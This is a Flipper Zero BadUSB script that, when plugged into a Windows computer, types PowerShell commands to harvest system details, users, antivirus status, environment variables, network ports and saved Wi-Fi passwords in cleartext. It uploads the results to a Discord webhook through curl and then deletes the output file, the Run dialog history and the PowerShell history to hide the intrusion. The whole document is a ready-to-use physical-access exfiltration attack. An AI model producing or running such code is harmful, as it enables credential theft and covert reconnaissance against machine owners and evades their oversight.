let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let eventLoop = require("event_loop");
let gui = require("gui");
let dialog = require("gui/dialog");

let views = {
	dialog: dialog.makeWith({
		header: "Clean Exfil Fast Webhook",
		text: "Press OK to start",
		center: "Start",
	}),
};

//Script
let script = [
	"Get-Date -Format yyyy-MM-dd >> stats.txt;",//Get Date
	"Get-Date -Format hh-mm-ss >> stats.txt;",//Get Time
	"Get-CimInstance -ClassName Win32_ComputerSystem >> stats.txt;", //Listing computer manufacturer and model
	"Get-LocalUser >> stats.txt;", //List users on the system 
	"Get-LocalUser | Where-Object -Property PasswordRequired -Match false >> stats.txt;", //Which users has password required set to false
	"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> stats.txt;", // List which AntiVirus Product is being used
	"Get-CimInstance -ClassName Win32_QuickFixEngineering >> stats.txt;", // Listing installed hotfixes
	"(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;",//Get network profiles with passwords
	"dir env: >> stats.txt;", //Check ENV
	"Get-Computerinfo >> stats.txt;", //ComputerInfo
	"Get-Service >> stats.txt;", // Get runing services 
	"Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;", //Check all IPV4 sufix that is not localhost
	"GEt-NetTCPConnection | Where-Object -Property State -Match Listen >> stats.txt;", //List listening ports	
	"Get-NetTCPConnection | Select-Object -Property * >> stats.txt;", // Get TCP information, ports, state etc..
];

badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfrName: "Flipper",
    prodName: "Zero",
    layoutPath: "/ext/badusb/assets/layouts/en-US.kl"
});

eventLoop.subscribe(views.dialog.input, function (_sub, button, eventLoop, gui) {
    if (button !== "center")
        return;

    gui.viewDispatcher.sendTo("back");

    if (badusb.isConnected()) {
        notify.blink("green", "short");
        print("USB is connected");

        // Open powershell
        print("Opening powershell");
        badusb.press("GUI", "r");
        delay(600);
        badusb.println("powershell -NoProfile -ExecutionPolicy Bypass");
        delay(1000);

        // Run payload
        print("Running payload");
        for (let i = 0; i < script.length; i++) {
            badusb.println(script[i]);
            delay(100);
        }
        delay(2000);

		// Creating payload (I am Jakoby on github)
		print("Creating payload");
		badusb.println("function Upload-Discord{");
		
		badusb.println("[CmdletBinding()]");
		badusb.println("Param(");
		badusb.println("[Parameter(Position=0,Mandatory=$False)]");
		badusb.println("[string]$file,");
		badusb.println("[Parameter(Position=1,Mandatory=$False)]");
		badusb.println("[string]$text)");

		badusb.println("$hookurl = \"<Webhookurl>\"");
		
		badusb.println("$Body = @{");
		badusb.println("\'username\' = $env:username");
		badusb.println("\'content\' = $text}");

		badusb.println("if (-not ([string]::IsNullOrEmpty($text))){")
		badusb.println("Invoke-RestMethod -ContentType \'Application/Json\' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};")

		badusb.println("if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F \"file1=@$file\" $hookurl}}")

		// Uploading webhook
		print("Uploading webhook");
		badusb.println("Upload-Discord -file \"stats.txt\"");

		// Delete traces
		print("Deleting traces");
        badusb.println("Remove-Item stats.txt");
        badusb.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
        badusb.println("Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue");
        delay(600);
        // badusb.println("exit");
        // delay(2000);

        print("Done");
        notify.success();
    } else {
        print("USB not connected");
        notify.error();
    }

    badusb.quit();
    eventLoop.stop();
}, eventLoop, gui);

eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _item, eventLoop) {
    eventLoop.stop();
}, eventLoop);

gui.viewDispatcher.switchTo(views.dialog);
eventLoop.run();